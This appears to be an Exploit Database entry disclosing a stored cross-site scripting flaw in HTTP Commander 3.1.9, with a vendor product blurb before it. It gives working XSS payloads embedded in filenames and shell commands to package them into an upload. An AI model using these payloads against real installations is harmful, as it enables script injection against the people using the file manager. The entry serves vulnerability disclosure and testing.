## What is HTTP Commander?

##### web based file management

---

**HTTP Commander** is a web based file management solution hosted on your own server.
It provides a basic functionality for working with files (creating, coping, deleting, etc.) and many other additional features such as the integration with cloud services, editing Office documents online directly in your browser, tags, comments, and more.

It's ideal for the integration into an **existing Active Directory** Structure, since you can use your existing user base, existing network shares and NTFS permissions. With HTTP Commander you can configure external access to existing SMB shares within 10 minutes.

It also can be used **without an AD**, so users can register themselves, administrators can manage the users directly within the application.

HTTP Commander helps you quickly organize external access to internal folders/files (located within the organization) for employees to **Work From Home**.

HTTP Commander is hosted on your own server. You pay for the license only once and there are no recurring payments.

You save up to 10 times compared to the cloud services.

```
# Exploit Title: HTTP Commander 3.1.9 - Stored Cross Site Scripting (XSS)
# Date: 07/01/2022
# Exploit Author: Oscar Sandén
# Vendor Homepage: https://www.element-it.com
# Software Link: https://www.element-it.com/downloads.aspx
# Version: 3.1.9
# Tested on: Windows Server 2016

[Description]
There is a stored XSS in the 'Zip content' feature of the HTTP commander application. The vulnerable field is the filename of the files inside the zip. This vulnerability exists in 3.x of the HTTP commander application.

[Steps to reproduce]
1)	Create a file with a xxs payload in its name. Examples:
<img src=x onerror=alert(1)>.txt
<img src=x onerror="document.location='https:'+String.fromCharCode(47)+String.fromCharCode(47)+'exploit-db.com'">.txt
Or some other JS you like.
2)	Zip the files
3)	Upload the ZIP-file
4)	In HTTP commander, right click the file and select ZIP-content.
5)	If the files are in a subfolder, expand it until the filenames are shown.

[Exploit]
touch payload/<img src=x onerror=alert(1)>.txt
Zip -r test.zip /payload

```

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
